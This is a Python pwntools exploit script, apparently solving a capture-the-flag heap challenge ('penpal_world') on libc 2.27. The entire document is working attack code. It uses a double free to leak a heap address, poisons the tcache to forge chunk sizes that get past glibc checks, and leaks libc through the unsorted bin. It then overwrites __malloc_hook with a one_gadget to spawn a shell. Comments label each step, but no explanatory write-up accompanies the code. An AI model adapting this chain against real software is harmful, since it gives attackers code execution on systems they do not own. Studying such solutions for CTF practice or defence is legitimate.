from pwn import *


libc = ELF('./libc-2.27.so')

def malloc(n):
	p.sendline('1')
	p.recvuntil('#?\n')
	p.sendline(str(n))
	p.recvuntil('4) Read a postcard\n')

def free(n):
	p.sendline('3')
	p.recvuntil('#?\n')
	p.sendline(str(n))
	p.recvuntil('4) Read a postcard\n')

def write(n, payload):
	p.sendline('2')
	p.recvuntil('#?\n')
	p.sendline(str(n))
	p.recvuntil('Write.\n')
	p.sendline(payload)
	p.recvuntil('4) Read a postcard\n')

def read(n):
    p.sendline('4')
    p.recvuntil('Which envelope #?\n')
    p.sendline(str(n))

# context.terminal = ['termite', '-e']
# p = gdb.debug('./penpal_world')
p = process('./penpal_world')

p.recvuntil('4) Read a postcard\n')

# malloc chunk
malloc(0)

# double free
free(0)
free(0)

# leak heap address that is now stored in fd pointer in chunk user data
read(0)

heap_leak = u64(p.recv(6) + '\x00\x00')
log.success('heap: {}'.format(hex(heap_leak)))

p.recvuntil('4) Read a postcard\n')

# setup arbitrary write into chunk header of following chunk by modifying fd
write(0, p64(heap_leak + 0x40))

# initial chunk
malloc(0)

# allocation of chunk header
malloc(1)

# allocation of new chunk
malloc(0)

# modify chunk size in chunk header
write(1, p64(0x0) + p64(0x91))

# bypass: double free or corruption (!prev)
malloc(1)
write(1, 'A' * 0x30 + p64(0x0) + p64(0x51))

# bypass: corrupted size vs. prev_size
malloc(1)
write(1, 'A' * 0x30 + p64(0x0) + p64(0x51))

# tcache poisoning
# fill the tcache with 7 free chunks
# the 8th chunk will go into the unsorted bin
for i in range(8):
	free(0)

# leak libc address by reading the fd pointer that points to libc main_arena
read(0)
libc_leak = u64(p.recv(6) + '\x00\x00')

libc_base = libc_leak - 0x3EBCA0
log.success('libc base: {}'.format(hex(libc_base)))

malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x10a38c

# allocate chunk
malloc(0)

# use-after-free
free(0)

# modify fd to point to fake chunk malloc_hook-0x23
write(0, p64(malloc_hook-0x23))

# malloc chunk again
malloc(0)

# malloc the fake chunk
malloc(0)

# overwrite __malloc_hook with one_gadget 
write(0, 'A' * 0x23 + p64(one_gadget))

# malloc something to trigger shell
p.sendline('1\n0')
p.interactive()